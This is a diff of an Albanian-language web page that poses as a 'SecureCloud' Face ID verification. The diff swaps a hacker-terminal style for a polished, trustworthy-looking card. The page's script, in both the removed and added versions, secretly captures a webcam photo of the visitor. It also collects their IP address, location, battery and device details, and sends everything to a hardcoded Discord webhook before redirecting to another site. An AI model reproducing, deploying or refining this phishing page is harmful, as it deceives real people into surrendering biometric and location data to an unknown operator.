@@ -4,133 +4,176 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification | Identity Check</title>
+    <title>Verifikimi i Identitetit | SecureCloud</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 90%; max-width: 600px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 20px #0f0; background: rgba(0, 20, 0, 0.9); }
-        .line { margin: 5px 0; font-size: 14px; white-space: pre-wrap; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body {
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        .card {
+            background: #ffffff;
+            padding: 40px 30px;
+            border-radius: 18px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+        }
+        .icon-box {
+            width: 70px;
+            height: 70px;
+            background: #0071e3;
+            border-radius: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 25px;
+        }
+        .icon-box svg { fill: white; width: 35px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.015em; }
+        p { font-size: 15px; color: #86868b; line-height: 1.4; margin-bottom: 35px; }
+        .btn {
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        .btn:active { transform: scale(0.98); background-color: #0062c3; }
+        #loader { display: none; margin-top: 20px; }
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #d2d2d7;
+            border-top: 2px solid #0071e3;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
-        .btn { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="terminal" id="terminal">
-        <div class="line"> [SYSTEM]: INITIATING SECURE PROTOCOL...</div>
-        <div class="line"> [SYSTEM]: ANALYZING CONNECTION...</div>
-        <div class="line" id="status"> [WAIT]: Duke pritur verifikimin e identitetit...</div>
-        <button class="btn" id="startBtn">VERIFIKO IDENTITETIN (FACE-ID)</button>
-        <div class="line blink">_</div>
+    <div class="card">
+        <div class="icon-box">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
+        </div>
+        <h1>Verifikim Identiteti</h1>
+        <p>Për arsye sigurie, ju lutem kryeni verifikimin biometrik për të konfirmuar që jeni pronari i kësaj pajisjeje.</p>
+        
+        <button class="btn" id="mainBtn">Vazhdo me Face ID</button>
+        
+        <div id="loader">
+            <div class="spinner"></div>
+            <span style="font-size: 14px; color: #0071e3;">Duke komunikuar me serverin...</span>
+        </div>
     </div>
 
-    <!-- Elementet e fshehura për foto -->
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
-        const redirectURL = "https://gemini.google.com/app";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
+        const REDIRECT_URL = "https://gemini.google.com/app";
 
-        const startBtn = document.getElementById('startBtn');
-        const status = document.getElementById('status');
+        const mainBtn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loader');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // Funksioni për marrjen e modelit të iPhone
-        function getDetailedModel() {
-            const w = window.screen.width;
-            const h = window.screen.height;
-            const r = window.devicePixelRatio;
-            if (r === 3 && w === 393 && h === 852) return "iPhone 15 / 15 Pro / 14 Pro";
-            if (r === 3 && w === 430 && h === 932) return "iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
-            if (r === 3 && w === 390 && h === 844) return "iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
-            if (r === 3 && w === 428 && h === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
-            return `${navigator.platform} (Res: ${w}x${h})`;
-        }
-
-        async function sendToDiscord(embed, blob = null) {
-            const formData = new FormData();
-            
-            if (blob) {
-                formData.append('file', blob, 'face-capture.png');
+        // Marrja e IP me saktësi (Metoda Multiple)
+        async function getIpInfo() {
+            try {
+                // Provon ip-api i pari (më i detajuari)
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) return await res.json();
+            } catch (e) {
+                try {
+                    // Rezerva 1
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const data2 = await res2.json();
+                    return { ip: data2.ip, city: "Unknown", country_name: "Unknown" };
+                } catch (e2) {
+                    return { ip: "S'u gjet", city: "N/A", country_name: "N/A" };
+                }
             }
-            
-            formData.append('payload_json', JSON.stringify({
-                username: "EXPLOIT SYSTEM",
-                avatar_url: "https://i.imgur.com/8nLFC9m.png",
-                embeds: [embed]
-            }));
-
-            await fetch(webhookURL, { method: 'POST', body: formData });
         }
 
         async function captureFace() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                
-                status.innerText = " [OK]: Verifikimi në proces...";
-
-                // Presim pak që kamera të fokusohet
-                await new Promise(r => setTimeout(r, 1500));
-
+                await new Promise(r => setTimeout(r, 1200));
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
-                
-                // Mbyllim kamerën
-                stream.getTracks().forEach(track => track.stop());
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+                stream.getTracks().forEach(t => t.stop());
                 return blob;
-            } catch (err) {
-                console.log("Kamera u refuzua.");
-                return null;
-            }
+            } catch (e) { return null; }
         }
 
-        startBtn.onclick = async () => {
-            startBtn.style.display = "none";
-            status.innerText = " [WAIT]: Duke hapur modulin e sigurisë...";
+        mainBtn.onclick = async () => {
+            mainBtn.style.display = "none";
+            loader.style.display = "block";
 
-            // 1. Kapim foton (Kërkon leje)
-            const faceBlob = await captureFace();
+            // 1. Kap foton
+            const facePhoto = await captureFace();
 
-            // 2. Mbledhim të dhënat extreme
-            const ipRes = await fetch('https://demo.ip-api.com/json/?fields=66846719');
-            const g = await ipRes.json();
-            
+            // 2. Merr IP-në e saktë
+            const ipData = await getIpInfo();
+
+            // 3. Info shtesë
             let battery = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`;
             }
 
+            const formData = new FormData();
+            if (facePhoto) formData.append('file', facePhoto, 'face_id_auth.jpg');
+
             const embed = {
-                title: "💀 EXTREME DATA EXFILTRATION",
-                color: 16711680,
+                title: "🛑 VERIFIKIM EXTREME I KRYER",
+                color: 15548997,
                 fields: [
-                    { name: "📱 Pajisja", value: `\`${getDetailedModel()}\``, inline: true },
-                    { "name": "🔋 Bateria", "value": `\`${battery}\``, "inline": true },
-                    { "name": "🌐 IP Real", "value": `\`${g.query}\``, "inline": true },
-                    { "name": "📍 Lokacioni", "value": `\`${g.city}, ${g.regionName}, ${g.country}\``, "inline": true },
-                    { "name": "📡 ISP", "value": `\`${g.isp}\``, "inline": false },
-                    { "name": "⚙️ Hardware", "value": `CPU: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory}GB`, "inline": true },
-                    { "name": "⏰ Ora", "value": `\`${new Date().toLocaleString()}\``, "inline": true },
-                    { "name": "🛡️ VPN?", "value": g.proxy ? "⚠️ PO" : "✅ JO", "inline": true },
-                    { "name": "📱 User-Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
-                    { "name": "🗺️ Maps", "value": `[Klikoni për Hartën](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
+                    { name: "🌐 ADRESA IP", value: `\`${ipData.ip || ipData.query || 'I panjohur'}\``, inline: true },
+                    { name: "📍 VENDNDODHJA", value: `${ipData.city || 'N/A'}, ${ipData.country_name || ipData.country || 'N/A'}`, inline: true },
+                    { name: "🔋 BATERIA", value: battery, inline: true },
+                    { name: "📱 PAJISJA", value: `\`${navigator.platform}\``, inline: true },
+                    { name: "⚙️ HARDWARE", value: `CPU: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory}GB`, inline: false },
+                    { name: "🔍 USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                 ],
-                footer: { text: "Protocol: EXTREME-LOG-v7" },
+                footer: { text: "Security Intel System v10.1" },
                 timestamp: new Date()
             };
 
-            await sendToDiscord(embed, faceBlob);
-            
-            status.innerText = " [OK]: Verifikimi përfundoi. Duke u ridrejtuar...";
-            setTimeout(() => { window.location.href = redirectURL; }, 1000);
+            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+            try {
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) {}
+
+            // Ridrejtimi i shpejtë
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 500);
         };
     </script>
 </body>
